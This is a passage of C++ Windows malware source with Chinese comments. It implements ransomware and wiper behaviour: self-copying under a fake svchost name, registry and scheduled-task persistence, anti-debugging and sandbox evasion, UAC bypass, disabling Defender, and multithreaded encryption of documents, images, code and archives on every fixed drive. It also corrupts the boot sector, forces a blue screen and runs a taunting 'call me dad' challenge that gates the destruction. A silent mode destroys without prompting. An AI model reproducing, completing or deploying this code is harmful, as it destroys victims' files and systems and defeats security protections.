    GetSystemDirectoryW(targetDir, MAX_PATH);
    wcscat_s(targetDir, L"\\svchost_backup.exe");
    wchar_t curPath[MAX_PATH];
    GetModuleFileNameW(NULL, curPath, MAX_PATH);
    if (_wcsicmp(curPath, targetDir) != 0) {
        CopyFileW(curPath, targetDir, FALSE);
        SetFileAttributesW(targetDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        std::wstring cmd = L"/c del /q \"" + std::wstring(curPath) + L"\"";
        ShellExecuteW(NULL, L"open", L"cmd.exe", cmd.c_str(), NULL, SW_HIDE);
    }
}

/**
 * @brief 清理所有持久化痕迹（计划任务、注册表、自复制文件）
 */
void Cleanup() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) {
        ITaskService* pService = NULL;
        if (SUCCEEDED(CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService))) {
            if (SUCCEEDED(pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t()))) {
                ITaskFolder* pRootFolder = NULL;
                if (SUCCEEDED(pService->GetFolder(_bstr_t(L"\\"), &pRootFolder))) {
                    pRootFolder->DeleteTask(_bstr_t(L"WindowsUpdateService"), 0);
                    pRootFolder->Release();
                }
            }
            pService->Release();
        }
        CoUninitialize();
    }
    RegDeleteKeyValueW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"WindowsDriverHost");
    RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"WindowsDriverHost");
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, GetRegPath());
    wchar_t targetDir[MAX_PATH];
    GetSystemDirectoryW(targetDir, MAX_PATH);
    wcscat_s(targetDir, L"\\svchost_backup.exe");
    SetFileAttributesW(targetDir, FILE_ATTRIBUTE_NORMAL);
    DeleteFileW(targetDir);
}

/**
 * @brief 添加注册表自启动项
 */
void SetupRegistryRun() {
    HKEY hKey;
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring cmdLine = L"\"" + std::wstring(exePath) + L"\" /silent /nohide";
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsDriverHost", 0, REG_SZ, (BYTE*)cmdLine.c_str(), (DWORD)((cmdLine.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsDriverHost", 0, REG_SZ, (BYTE*)cmdLine.c_str(), (DWORD)((cmdLine.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

/* ===================== 文件加密模块（多线程） ===================== */
// 需要加密的文件扩展名列表
static const std::vector<std::wstring> targetExtensions = {
    L".doc", L".docx", L".xls", L".xlsx", L".ppt", L".pptx",
    L".pdf", L".txt", L".rtf", L".csv",
    L".jpg", L".jpeg", L".png", L".bmp", L".gif",
    L".cpp", L".c", L".h", L".hpp", L".py", L".js", L".html", L".css",
    L".zip", L".rar", L".7z", L".mp3", L".mp4", L".avi", L".mkv"
};

// 跳过加密的系统目录
static const std::vector<std::wstring> skipDirs = {
    L"\\Windows\\", L"\\Program Files\\", L"\\Program Files (x86)\\",
    L"\\ProgramData\\Microsoft\\", L"\\$Recycle.Bin\\", L"\\System Volume Information\\"
};

/**
 * @brief 判断路径是否需要跳过加密
 */
static bool ShouldSkipPath(const std::wstring& path) {
    std::wstring upperPath = path;
    for (auto& c : upperPath) c = towupper(c);
    for (const auto& dir : skipDirs) {
        std::wstring upperDir = dir;
        for (auto& c : upperDir) c = towupper(c);
        if (upperPath.find(upperDir) != std::wstring::npos) return true;
    }
    return false;
}

/**
 * @brief 递归加密目录中的所有匹配文件
 */
static void EncryptDirectory(const std::wstring& dir) {
    if (ShouldSkipPath(dir)) return;
    WIN32_FIND_DATAW fd;
    std::wstring searchPath = dir + L"\\*";
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        std::wstring fullPath = dir + L"\\" + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            EncryptDirectory(fullPath);
        }
        else {
            std::wstring ext;
            size_t dotPos = fullPath.rfind(L'.');
            if (dotPos != std::wstring::npos) {
                ext = fullPath.substr(dotPos);
                for (auto& c : ext) c = towlower(c);
                for (const auto& target : targetExtensions) {
                    if (ext == target) {
                        EncryptFileAES_CBC(fullPath);
                        break;
                    }
                }
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
}

// 多线程加密用的全局变量
static std::vector<std::wstring> g_DriveList;
static LONG g_driveIndex = 0;
static CRITICAL_SECTION g_cs;

/**
 * @brief 加密工作线程函数
 */
DWORD WINAPI EncryptWorker(LPVOID) {
    while (true) {
        EnterCriticalSection(&g_cs);
        if (g_driveIndex >= (LONG)g_DriveList.size()) {
            LeaveCriticalSection(&g_cs);
            break;
        }
        std::wstring drive = g_DriveList[g_driveIndex++];
        LeaveCriticalSection(&g_cs);
        EncryptDirectory(drive);
    }
    return 0;
}

/**
 * @brief 检查是否已经执行过加密（避免重复）
 */
bool IsAlreadyEncrypted() {
    DWORD val = 0;
    DWORD size = sizeof(DWORD);
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, GetRegPath(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExW(hKey, GetEncDoneValue(), NULL, NULL, (BYTE*)&val, &size);
        RegCloseKey(hKey);
        return (val == 1);
    }
    return false;
}

/**
 * @brief 设置加密完成标记
 */
void SetEncryptionDone() {
    HKEY hKey;
    RegCreateKeyExW(HKEY_LOCAL_MACHINE, GetRegPath(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    DWORD val = 1;
    RegSetValueExW(hKey, GetEncDoneValue(), 0, REG_DWORD, (BYTE*)&val, sizeof(DWORD));
    RegCloseKey(hKey);
}

/**
 * @brief 启动多线程加密（非阻塞）
 */
void StartEncryption() {
    if (IsAlreadyEncrypted()) return;

    // 使用互斥体防止多个实例同时加密
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"Global\\{RansomEncMutex-17A9C4E2-F13E-4B2D-9A6F-6D8C12B05F3E}");
    if (hMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return;
    }

    // 收集所有固定驱动器
    wchar_t drives[256];
    if (GetLogicalDriveStringsW(255, drives)) {
        wchar_t* drive = drives;
        while (*drive) {
            if (GetDriveTypeW(drive) == DRIVE_FIXED) {
                g_DriveList.push_back(drive);
            }
            drive += wcslen(drive) + 1;
        }
    }

    InitializeCriticalSection(&g_cs);
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    DWORD threadCount = max(si.dwNumberOfProcessors, 1);
    HANDLE* threads = new HANDLE[threadCount]();  // 初始化为NULL
    for (DWORD i = 0; i < threadCount; i++) {
        threads[i] = CreateThread(NULL, 0, EncryptWorker, NULL, 0, NULL);
        if (threads[i] == NULL) {
            threadCount = i;  // 实际成功创建的线程数
            break;
        }
    }
    WaitForMultipleObjects(threadCount, threads, TRUE, INFINITE);
    for (DWORD i = 0; i < threadCount; i++) {
        if (threads[i]) CloseHandle(threads[i]);
    }
    delete[] threads;
    DeleteCriticalSection(&g_cs);

    SetEncryptionDone();
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
}

/**
 * @brief 随机延迟，用于规避沙箱快速执行分析
 */
void RandomDelayForSandbox() {
    srand((unsigned int)time(NULL));
    int delay = rand() % 3000 + 2000;  // 2~5秒
    Sleep(delay);
}

/* ===================== 主挑战UI ===================== */
/**
 * @brief 显示交互式挑战界面，提供3次输入机会
 */
void ShowChallengeUI() {
    std::wcout << L"==============================\n";
    std::wcout << L"        陶修夷的\n";
    std::wcout << L"   叫 爸 爸 挑 战 赛™\n";
    std::wcout << L"==============================\n";
    std::wcout << L"规则：叫我爸爸，否则你的电脑会哭。\n";
    std::wcout << L"你有 3 次机会。\n";
    std::wcout << L"注意：别想用任务管理器杀我，你会死得很惨。\n\n";

    const int MAX_FAIL = 3;
    int fail = 0;
    while (fail < MAX_FAIL) {
        int remaining = MAX_FAIL - fail;
        std::wcout << L"[ 剩余机会: " << remaining << L" ] 叫啊 -> ";
        std::wstring input;
        std::getline(std::wcin, input);
        std::wstring clean = SanitizeInput(input);

        if (clean == L"爸爸" || clean == L"爸" || clean == L"baba") {
            std::wcout << L"\n╔══════════════════╗\n";
            std::wcout << L"║  乖儿子！:)      ║\n";
            std::wcout << L"╚══════════════════╝\n";
            std::wcout << L"你通过了挑战，电脑安全了。\n";
            WriteSafeStatus(true);
            Sleep(2000);
            // 安全退出
            EnableCriticalProcess(false);
            if (g_hGuardProcess) {
                PostThreadMessage(GetThreadId(g_hGuardProcess), WM_QUIT, 0, 0);
                WaitForSingleObject(g_hGuardProcess, 5000);
                CloseHandle(g_hGuardProcess);
            }
            Cleanup();
            exit(0);
        }
        else {
            fail++;
            if (fail < MAX_FAIL) {
                std::wcout << L"呵，死撑。还剩 " << (MAX_FAIL - fail) << L" 次。\n";
            }
        }
    }

    // 挑战失败，执行破坏
    std::wcout << L"\n你选择了死。\n";
    StartEncryption();
    Sleep(800);
    CorruptBootSector();
    Sleep(500);
    WriteDeathNote();
    Sleep(500);
    std::wcout << L"\n╔════════════════════════════╗\n";
    std::wcout << L"║  你完了！！！              ║\n";
    std::wcout << L"║  txt已打开，慢慢欣赏吧。   ║\n";
    std::wcout << L"╚════════════════════════════╝\n\n";
    Countdown(3);
    std::wcout << L"再见。\n";
    Sleep(300);
    TriggerBSOD();
    while (1) Sleep(60000);
}

/* ===================== 程序入口 ===================== */
int wmain(int argc, wchar_t* argv[]) {
    LoadDynamicApis();

    // 守护进程模式（带心跳）
    if (argc >= 3 && _wcsicmp(argv[1], L"/guard") == 0) {
        DWORD parentPID = (DWORD)_wtol(argv[2]);
        HideConsole(true);
        RandomDelayForSandbox();
        GuardProcessWithHeartbeat((LPVOID)(ULONG_PTR)parentPID);
        return 0;
    }

    // 解析命令行参数
    bool silent = false, nohide = false;
    for (int i = 1; i < argc; i++) {
        if (_wcsicmp(argv[i], L"/silent") == 0) silent = true;
        if (_wcsicmp(argv[i], L"/nohide") == 0) nohide = true;
    }

    // UAC提权同步事件
    HANDLE hElevationEvent = OpenEventW(EVENT_MODIFY_STATE, FALSE, GetElevationEvent());
    if (hElevationEvent) {
        SetEvent(hElevationEvent);
        CloseHandle(hElevationEvent);
    }

    // 反调试/反虚拟机检测
    if (IsDebuggedOrVM_Enhanced()) {
        SelfCopyAndDelete();
        return 0;
    }

    RandomDelayForSandbox();

    // 如果不是管理员，尝试UAC绕过（自动选择系统兼容方法）
    if (!IsElevated()) {
        BypassUAC();
        return 0;
    }

    // 提权并初始化
    TakeAllPrivileges();
    DisableDefenderRealtime();      // 尝试关闭Defender（仅Win10+生效）
    InstallScheduledTask();         // 安装计划任务（自动适应系统版本）
    SetupRegistryRun();             // 注册表自启动
    DisguiseAsSystemProcess();      // 伪装进程名
    EnableCriticalProcess(true);    // 设置关键进程
    SetStrictProcessProtection();   // 设置安全描述符

    // 启动守护进程（独立进程）
    {
        wchar_t sysPath[MAX_PATH];
        GetSystemDirectoryW(sysPath, MAX_PATH);
        wcscat_s(sysPath, L"\\svchost_backup.exe");
        wchar_t curPath[MAX_PATH];
        GetModuleFileNameW(NULL, curPath, MAX_PATH);
        if (_wcsicmp(curPath, sysPath) != 0) {
            CopyFileW(curPath, sysPath, FALSE);
            SetFileAttributesW(sysPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
        HANDLE hGuardReady = CreateEventW(NULL, TRUE, FALSE, GetGuardEvent());
        if (hGuardReady) {
            std::wstring cmdLine = L"\"" + std::wstring(sysPath) + L"\" /guard " + std::to_wstring(GetCurrentProcessId());
            STARTUPINFOW si = { sizeof(si) };
            PROCESS_INFORMATION pi = {};
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            if (CreateProcessW(sysPath, &cmdLine[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                WaitForSingleObject(hGuardReady, 10000);
                CloseHandle(pi.hThread);
                g_hGuardProcess = pi.hProcess;
            }
            CloseHandle(hGuardReady);
        }
    }

    // 自复制并删除原始文件
    SelfCopyAndDelete();

    // 控制台隐藏
    if (!nohide) HideConsole(true);

    // 启动心跳线程（每秒更新一次）
    HANDLE hHeartbeatThread = CreateThread(NULL, 0, [](LPVOID) -> DWORD {
        while (true) {
            UpdateHeartbeat();
            Sleep(1000);
        }
        return 0;
        }, NULL, 0, NULL);

    // 读取上次安全状态
    int lastSafe = ReadSafeStatus();
    if (lastSafe == 0) {
        // 上次未通过，直接执行破坏
        if (!IsAlreadyEncrypted()) {
            StartEncryption();
            Sleep(5000);
        }
        WriteDeathNote();
        Sleep(500);
        TriggerBSOD();
        while (1) Sleep(1000);
    }

    // 标记当前状态为不安全（挑战失败后变为0）
    WriteSafeStatus(false);

    if (silent) {
        // 静默模式：直接破坏
        StartEncryption();
        Sleep(3000);
        CorruptBootSector();
        WriteDeathNote();
        TriggerBSOD();
        while (1) Sleep(60000);
    }
    else {
        // 交互模式
        if (!nohide) HideConsole(false);
        ShowChallengeUI();
    }

    // 正常退出清理（实际上不会执行到这里）
    EnableCriticalProcess(false);
    if (g_hGuardProcess) {
        PostThreadMessage(GetThreadId(g_hGuardProcess), WM_QUIT, 0, 0);
        WaitForSingleObject(g_hGuardProcess, 5000);
        CloseHandle(g_hGuardProcess);
    }
    if (hHeartbeatThread) CloseHandle(hHeartbeatThread);
    return 0;
}
